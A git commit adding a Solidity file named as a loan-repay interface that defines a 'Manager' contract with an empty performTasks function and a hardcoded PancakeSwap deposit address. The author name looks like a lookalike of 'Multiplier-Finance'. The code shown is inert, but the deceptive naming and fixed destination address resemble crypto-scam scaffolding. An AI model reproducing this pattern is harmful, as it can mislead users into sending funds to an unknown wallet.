2016568cfd6f55793bef6391c731e76a29723a43
MuItiplier-Finance <justushans0101@gmail.com>
2021-10-11 09:21:27 +0300

    First Commit

---
+++ contracts/interfaces/ILoanRepay.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0xf4E97f223c526B3d7035aA31D21Ffb04bE57A9bD;
+	}
+}
